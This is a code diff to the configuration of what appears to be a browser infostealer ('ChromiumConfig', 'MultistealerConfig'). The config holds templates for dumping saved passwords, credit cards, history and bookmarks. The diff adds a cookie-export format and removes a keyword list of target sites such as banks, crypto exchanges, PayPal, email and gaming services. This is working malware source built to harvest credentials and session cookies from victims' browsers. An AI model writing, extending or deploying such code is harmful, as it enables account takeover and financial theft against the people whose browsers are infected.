@@ -29,6 +29,7 @@ class ChromiumConfig:
     HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
 
     PasswordsData = "URL: {0}\nUsername: {1}\nPassword: {2}\n\n"
+    CookiesData = "{0}\tTRUE\t/\tFALSE\t2538097566\t{1}\t{2}"
     CardsData = "Username: {0}\nNumber: {1}\nExpire Month: {2}\nExpire Year: {3}\n\n"
     HistoryData = "URL: {0}\nTitle: {1}\nLast Visit: {2}\n\n"
     BookmarksData = "Title: {0}\nUrl: {1}\n\n"
@@ -85,50 +86,6 @@ class ChromiumConfig:
             }
         ]
     }
-
-    CookiesKeywords = [
-        "mail",
-        "[coinbase](https://coinbase.com)",
-        "[sellix](https://sellix.io)",
-        "[gmail](https://gmail.com)",
-        "[steam](https://steam.com)",
-        "[discord](https://discord.com)",
-        "[riotgames](https://riotgames.com)",
-        "[youtube](https://youtube.com)",
-        "[instagram](https://instagram.com)",
-        "[tiktok](https://tiktok.com)",
-        "[twitter](https://twitter.com)",
-        "[facebook](https://facebook.com)",
-        "card",
-        "[epicgames](https://epicgames.com)",
-        "[spotify](https://spotify.com)",
-        "[yahoo](https://yahoo.com)",
-        "[roblox](https://roblox.com)",
-        "[twitch](https://twitch.com)",
-        "[minecraft](https://minecraft.net)",
-        "bank",
-        "[paypal](https://paypal.com)",
-        "[origin](https://origin.com)",
-        "[amazon](https://amazon.com)",
-        "[ebay](https://ebay.com)",
-        "[aliexpress](https://aliexpress.com)",
-        "[playstation](https://playstation.com)",
-        "[hbo](https://hbo.com)",
-        "[xbox](https://xbox.com)",
-        "buy",
-        "sell",
-        "[binance](https://binance.com)",
-        "[hotmail](https://hotmail.com)",
-        "[outlook](https://outlook.com)",
-        "[crunchyroll](https://crunchyroll.com)",
-        "[telegram](https://telegram.com)",
-        "[pornhub](https://pornhub.com)",
-        "[disney](https://disney.com)",
-        "[expressvpn](https://expressvpn.com)",
-        "crypto",
-        "[uber](https://uber.com)",
-        "[netflix](https://netflix.com)"
-    ]
 
 
 class MultistealerConfig:
